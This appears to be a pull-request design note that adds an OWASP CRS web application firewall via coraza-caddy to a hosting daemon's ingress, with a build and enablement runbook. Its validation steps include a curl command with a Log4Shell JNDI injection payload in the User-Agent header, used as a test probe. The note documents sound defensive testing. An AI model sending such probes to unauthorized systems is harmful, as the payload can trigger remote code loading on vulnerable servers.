# Tier 3 PR-3 — coraza-caddy ingress WAF

> Part of the virtual-patching epic (#659); #662. Implements the **coraza-caddy
> first** path from
> [`TIER3-WAF-ENGINE-DECISION.md`](./TIER3-WAF-ENGINE-DECISION.md): WAF the
> north-south ingress that already flows through Caddy, where TLS is terminated
> and HTTP is parsed for free. The standalone TPROXY proxy (#667, PR-1/PR-2)
> remains the east-west complement.

## What this PR ships

The plumbing to run the OWASP CRS on ingress HTTP via the coraza-caddy plugin —
**off by default**, and with the daemon's own dependency surface untouched (Coraza
lives in the Caddy build, not the daemon's `go.mod`):

- **Build** (`internal/hosting/caddy.go`): `xcaddyBuildArgs` adds
  `--with github.com/corazawaf/coraza-caddy/v2` to the existing custom Caddy build
  (already `--with caddy-l4`) **only when `CaddyConfig.WAF` is set**. The
  build-verification check then also requires `http.handlers.waf` in
  `list-modules`.
- **Handler** (`internal/app/caddy_types.go`): `CaddyWAFHandler` (Caddy module
  `waf`) + `DefaultWAFDirectives(enforce)` (loads `@coraza.conf-recommended`,
  `@crs-setup.conf.example`, `@owasp_crs/*.conf`, and `SecRuleEngine
  On|DetectionOnly`) + `PrependWAF`, which inserts the WAF handler **before**
  `reverse_proxy` in a route's handler chain.
- **Route programming** (`internal/app/proxy.go`): `caddyRouteJSON.Handle` became
  `[]CaddyHandler` so the chain can carry the WAF handler; `ProxyManager.WithWAF`
  enables it. **When WAF is off the programmed route JSON is byte-identical to
  before** (a `reverse_proxy` handler marshals the same through the interface) —
  guarded by a test.
- **Opt-in** (`dual_server.go`): `CONTAINARIUM_WAF_INGRESS=1` turns it on;
  `SecRuleEngine` is `DetectionOnly` (observe + log) unless
  `CONTAINARIUM_NETWORK_POLICY_ENFORCE=1` arms blocking — the same observe-then-arm
  gate as the kernel tiers.

## What this PR does NOT do (deferred)

- It does **not** build or deploy the custom Caddy binary — that's an operator
  step (below). `xcaddy` + network access are needed, and the binary deploys into
  the `core-caddy` LXC. Pure-Go layers (build-arg gating, handler JSON, injection)
  are unit-tested; the actual block requires the deployed binary.
- Per-tenant / per-route WAF selection (vs. the current all-HTTP-routes toggle),
  TLS-passthrough routes (no termination → nothing to inspect), and the
  scanner→virtual-patch-rule hook are follow-ups.

## Enabling it (operator runbook)

1. **Build a Caddy with the coraza module.** The daemon does this automatically
   when `CaddyConfig.WAF` is set (it runs `xcaddy build … --with
   github.com/corazawaf/coraza-caddy/v2`). To pre-build manually:
   ```sh
   xcaddy build \
     --with github.com/caddy-dns/<provider> \
     --with github.com/mholt/caddy-l4 \
     --with github.com/corazawaf/coraza-caddy/v2 \
     --output /usr/local/bin/caddy
   caddy list-modules | grep http.handlers.waf   # must be present
   ```
   Deploy that binary into the `core-caddy` LXC (replacing stock `/usr/bin/caddy`)
   and restart Caddy.
2. **Start the daemon with the opt-ins:**
   ```sh
   CONTAINARIUM_WAF_INGRESS=1          # prepend the WAF handler to ingress routes
   # CONTAINARIUM_NETWORK_POLICY_ENFORCE=1   # add this to BLOCK; omit to soak (DetectionOnly)
   ```
   New routes programmed by the daemon now carry the WAF handler. (Existing routes
   pick it up when re-programmed.)

## Validation (backend, not CI)

Needs the deployed coraza Caddy + a tenant HTTP app. Not runnable in CI / on the
dev mac (custom Caddy build + a live ingress path).

1. With `WAF_INGRESS=1` but **no** ENFORCE (DetectionOnly): send a Log4Shell
   probe to a tenant app's public URL —
   `curl -H 'User-Agent: ${jndi:ldap://x/a}' https://<app>.<base-domain>/` — and
   confirm Caddy's log shows a CRS match (rule 944xxx) and the request **still
   reaches the app** (observe-only).
2. Add `ENFORCE=1`, re-program the route, repeat: the request now gets a **403**
   from Coraza and never reaches the app, while a benign request still passes.
3. Confirm a **TLS** Log4Shell (same probe over HTTPS) is caught — the win over
   Tier 2: Caddy terminated TLS, so Coraza saw the decrypted header.
4. Confirm non-WAF tenants / routes are unaffected (byte-identical routing).

## Honest scope

This covers **north-south ingress only** — east-west (container→container) never
hits Caddy and is the standalone TPROXY proxy's job (#667). Don't let "ingress WAF
on" imply full coverage. TLS-passthrough routes are also out of scope (Caddy
doesn't terminate them, so there's nothing to inspect).
